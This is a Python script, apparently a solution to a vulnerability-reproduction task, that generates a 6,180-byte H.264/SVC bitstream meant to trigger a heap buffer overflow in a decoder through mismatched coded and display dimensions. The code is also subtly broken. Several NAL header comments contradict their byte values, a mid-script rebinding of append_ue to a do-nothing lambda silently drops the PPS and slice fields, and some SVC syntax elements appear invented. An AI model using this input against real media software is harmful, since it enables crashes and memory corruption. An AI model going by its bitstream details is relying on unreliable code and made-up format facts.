import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal SVC bitstream with dimension mismatch
        # Structure: NAL unit header + subset sequence parameter set + 
        # display dimensions that don't match the coded dimensions
        
        # Start with NAL unit header (for SVC NALU)
        # NAL unit type 15 = subset sequence parameter set
        nal_header = b'\x0F'  # F = 00011111 (F=0, NRI=3, Type=15)
        
        # Subset SPS structure (simplified)
        # profile_idc = 83 (SVC)
        # constraint_set_flags
        # level_idc
        # seq_parameter_set_id
        # chroma_format_idc
        # bit_depth_luma_minus8
        # bit_depth_chroma_minus8
        # qpprime_y_zero_transform_bypass_flag
        # seq_scaling_matrix_present_flag
        # log2_max_frame_num_minus4
        # pic_order_cnt_type
        # log2_max_pic_order_cnt_lsb_minus4
        # max_num_ref_frames
        # gaps_in_frame_num_value_allowed_flag
        # pic_width_in_mbs_minus1
        # pic_height_in_map_units_minus1
        # frame_mbs_only_flag
        # direct_8x8_inference_flag
        # frame_cropping_flag
        # vui_parameters_present_flag
        # svc_vui_parameters_present_flag
        
        # We'll create a simple SPS that triggers the dimension mismatch
        
        # Build the bitstream using byte-oriented approach
        bits = []
        
        def append_bits(val, num_bits):
            for i in range(num_bits-1, -1, -1):
                bits.append((val >> i) & 1)
        
        def append_ue(val):
            # Exponential Golomb coding
            val += 1
            bits_required = val.bit_length()
            prefix = bits_required - 1
            # Append prefix zeros
            for _ in range(prefix):
                bits.append(0)
            # Append the value in binary
            for i in range(prefix, -1, -1):
                bits.append((val >> i) & 1)
        
        def append_se(val):
            # Signed Exponential Golomb
            if val <= 0:
                mapped = -2 * val
            else:
                mapped = 2 * val - 1
            append_ue(mapped)
        
        def bits_to_bytes():
            # Convert bits to bytes with RBSP
            byte_list = []
            current_byte = 0
            bit_count = 0
            
            # Helper to add a byte
            def add_byte(b):
                nonlocal current_byte, bit_count
                current_byte = (current_byte << 8) | b
                bit_count += 8
                if bit_count >= 8:
                    byte_list.append((current_byte >> (bit_count - 8)) & 0xFF)
                    bit_count -= 8
            
            # Convert bits to bytes
            for bit in bits:
                current_byte = (current_byte << 1) | bit
                bit_count += 1
                if bit_count == 8:
                    # Check for start code emulation
                    byte_val = current_byte & 0xFF
                    if (len(byte_list) >= 2 and 
                        byte_list[-2] == 0 and 
                        byte_list[-1] == 0 and 
                        byte_val < 0x03):
                        # Insert emulation prevention byte
                        byte_list.append(0x03)
                    byte_list.append(byte_val)
                    current_byte = 0
                    bit_count = 0
            
            # Flush remaining bits
            if bit_count > 0:
                current_byte <<= (8 - bit_count)
                byte_val = current_byte & 0xFF
                if (len(byte_list) >= 2 and 
                    byte_list[-2] == 0 and 
                    byte_list[-1] == 0 and 
                    byte_val < 0x03):
                    byte_list.append(0x03)
                byte_list.append(byte_val)
            
            return bytes(byte_list)
        
        # Start building the subset SPS
        append_bits(83, 8)  # profile_idc = 83 (SVC)
        append_bits(0, 8)   # constraint_set0_flag ... constraint_set5_flag
        append_bits(0, 2)   # reserved_zero_2bits
        append_bits(51, 8)  # level_idc = 5.1
        
        append_ue(0)        # seq_parameter_set_id = 0
        
        # Chroma format
        append_ue(1)        # chroma_format_idc = 4:2:0
        append_ue(0)        # bit_depth_luma_minus8 = 0
        append_ue(0)        # bit_depth_chroma_minus8 = 0
        append_bits(0, 1)   # qpprime_y_zero_transform_bypass_flag = 0
        append_bits(0, 1)   # seq_scaling_matrix_present_flag = 0
        
        append_ue(0)        # log2_max_frame_num_minus4 = 0
        append_ue(2)        # pic_order_cnt_type = 2 (explicit)
        append_ue(0)        # log2_max_pic_order_cnt_lsb_minus4 = 0
        append_ue(1)        # max_num_ref_frames = 1
        append_bits(0, 1)   # gaps_in_frame_num_value_allowed_flag = 0
        
        # Dimensions that will cause overflow
        # Use dimensions that don't match display dimensions later
        append_ue(119)      # pic_width_in_mbs_minus1 = 119 (1920/16-1)
        append_ue(67)       # pic_height_in_map_units_minus1 = 67 (1088/16-1)
        
        append_bits(1, 1)   # frame_mbs_only_flag = 1
        append_bits(0, 1)   # direct_8x8_inference_flag = 0
        
        append_bits(0, 1)   # frame_cropping_flag = 0
        append_bits(1, 1)   # vui_parameters_present_flag = 1
        
        # VUI parameters with display dimensions mismatch
        append_bits(1, 1)   # aspect_ratio_info_present_flag = 1
        append_bits(1, 8)   # aspect_ratio_idc = 1 (1:1 square pixels)
        
        # sar_width and sar_height when aspect_ratio_idc == 255
        # Not needed since we used 1
        
        # Overscan and video format
        append_bits(0, 1)   # overscan_info_present_flag = 0
        append_bits(0, 1)   # video_signal_type_present_flag = 0
        
        # Chroma location
        append_bits(0, 1)   # chroma_loc_info_present_flag = 0
        
        # Timing info
        append_bits(0, 1)   # timing_info_present_flag = 0
        
        # HRD parameters
        append_bits(0, 1)   # nal_hrd_parameters_present_flag = 0
        append_bits(0, 1)   # vcl_hrd_parameters_present_flag = 0
        
        # Picture structure
        append_bits(0, 1)   # pic_struct_present_flag = 0
        
        # Bitstream restriction
        append_bits(1, 1)   # bitstream_restriction_flag = 1
        append_bits(0, 1)   # motion_vectors_over_pic_boundaries_flag = 0
        append_ue(2)        # max_bytes_per_pic_denom = 2
        append_ue(1)        # max_bits_per_mb_denom = 1
        append_ue(10)       # log2_max_mv_length_horizontal = 10
        append_ue(10)       # log2_max_mv_length_vertical = 10
        append_ue(0)        # num_reorder_frames = 0
        append_ue(0)        # max_dec_frame_buffering = 0
        
        # SVC VUI extension
        append_bits(1, 1)   # svc_vui_parameters_present_flag = 1
        
        # Add some SVC-specific parameters that might trigger the overflow
        # when display dimensions don't match
        append_bits(1, 1)   # svc_bitstream_restriction_flag = 1
        append_ue(1)        # svc_max_num_reorder_frames = 1
        append_ue(2)        # svc_max_dec_frame_buffering = 2
        
        # Critical: Set display dimensions that DON'T match coded dimensions
        # This is what triggers the heap buffer overflow
        append_bits(1, 1)   # display_dimensions_present_flag = 1
        append_ue(59)       # display_width_in_mbs_minus1 = 59 (960/16-1) - HALF WIDTH!
        append_ue(33)       # display_height_in_mbs_minus1 = 33 (544/16-1) - HALF HEIGHT!
        
        # Add padding to reach target length while ensuring it's valid enough
        # to reach the vulnerable code
        append_bits(0, 8)   # trailing bits
        append_bits(1, 1)   # rbsp_stop_one_bit
        while len(bits) % 8 != 0:
            append_bits(0, 1)  # rbsp_alignment_zero_bit
        
        # Convert to bytes
        sps_data = bits_to_bytes()
        
        # Create final bitstream with start code and padding
        # Start code prefix
        start_code = b'\x00\x00\x00\x01'
        
        # Build the complete PoC
        poc = start_code + nal_header + sps_data
        
        # Add more NAL units to ensure we reach the vulnerable code
        # Add a picture parameter set
        pps_header = b'\x0E'  # NAL unit type 8 = picture parameter set
        pps_bits = []
        
        # Simple PPS
        append_ue = lambda val: None  # We'll reuse from outer scope
        # Reset bits list
        original_bits = bits
        bits = pps_bits
        
        append_ue(0)  # pic_parameter_set_id = 0
        append_ue(0)  # seq_parameter_set_id = 0
        append_bits(0, 1)  # entropy_coding_mode_flag = 0
        append_bits(0, 1)  # pic_order_present_flag = 0
        append_ue(0)  # num_slice_groups_minus1 = 0
        append_ue(0)  # num_ref_idx_l0_default_active_minus1 = 0
        append_ue(0)  # num_ref_idx_l1_default_active_minus1 = 0
        append_bits(0, 1)  # weighted_pred_flag = 0
        append_bits(0, 2)  # weighted_bipred_idc = 0
        append_se(0)  # pic_init_qp_minus26 = 0
        append_se(0)  # pic_init_qs_minus26 = 0
        append_se(0)  # chroma_qp_index_offset = 0
        append_bits(0, 1)  # deblocking_filter_control_present_flag = 0
        append_bits(0, 1)  # constrained_intra_pred_flag = 0
        append_bits(0, 1)  # redundant_pic_cnt_present_flag = 0
        
        # Convert PPS to bytes
        pps_data = bits_to_bytes()
        poc += start_code + pps_header + pps_data
        
        # Restore original bits for padding
        bits = original_bits
        
        # Pad to target length with additional NAL units if needed
        # Add filler data that looks like slice headers
        while len(poc) < 6180:
            # Add slice NAL units (type 1 for non-IDR)
            slice_header = b'\x21'  # NALU type 1, NRI=1
            slice_bits = []
            bits = slice_bits
            
            # Simple slice header
            append_ue(0)  # first_mb_in_slice
            append_ue(0)  # slice_type (P slice)
            append_ue(0)  # pic_parameter_set_id
            append_bits(0, 1)  # frame_num (4 bits for our log2_max_frame_num)
            for _ in range(3):
                append_bits(0, 1)
            
            # Add some filler bits
            for _ in range(100):
                append_bits(0, 1)
            
            slice_data = bits_to_bytes()
            poc += start_code + slice_header + slice_data
            
            if len(poc) > 6180:
                poc = poc[:6180]
                break
        
        # Ensure exact length
        if len(poc) < 6180:
            poc += b'\x00' * (6180 - len(poc))
        elif len(poc) > 6180:
            poc = poc[:6180]
        
        return poc
